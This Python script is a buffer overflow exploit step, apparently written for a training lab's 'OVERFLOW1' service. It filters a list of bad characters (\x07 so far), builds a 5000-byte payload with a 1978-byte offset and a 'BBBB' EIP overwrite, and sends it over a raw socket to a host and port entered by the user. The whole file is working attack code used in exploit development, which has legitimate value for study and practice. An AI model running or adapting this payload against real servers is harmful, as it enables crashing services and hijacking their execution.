import socket
import string

# user input 
host = input("Enter the host name: ")
port = int(input("Enter the port number: "))

# get the list of badcharacters using bytearray function
all_chars = bytearray(range(1, 256))

# print the all_chars list
print(all_chars)

# create a list called bad_char
bad_chars = [
    b"\x07",

] # we will manually add the exact bad character here

# remove the bad_char from all_chars using iterator function
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char,b"")
    
print("After filtering the bad characters")
print(all_chars)

# print the message ""Similating host and port with thier value
print("Similating host and port with thier value")
print("Host: " + host)
print("Port: " + str(port))

# Create a byte string literal with content "OVERFLOW1 " encoded as bytes
command = b"OVERFLOW1 "
length = 5000
offset = 1978
new_eip = b"BBBB"

# Create a payload using this command and 5000 A's to bufferoverflow a target server using .join
payload = b"".join(
    [
        command,
        b"A" * offset,
        new_eip,
        all_chars,
        b"C" * (length-len(new_eip)-offset-len(all_chars)),
    ]
)

# print the payload
print("Payload: " + str(payload))


# connect to the host at port with autoclosable
with socket.socket() as s:
    # connect to the host
    s.connect((host, port))
    print("Connected to " + host + ":" + str(port))
    
    # send the payload to the host
    s.send(payload)
    

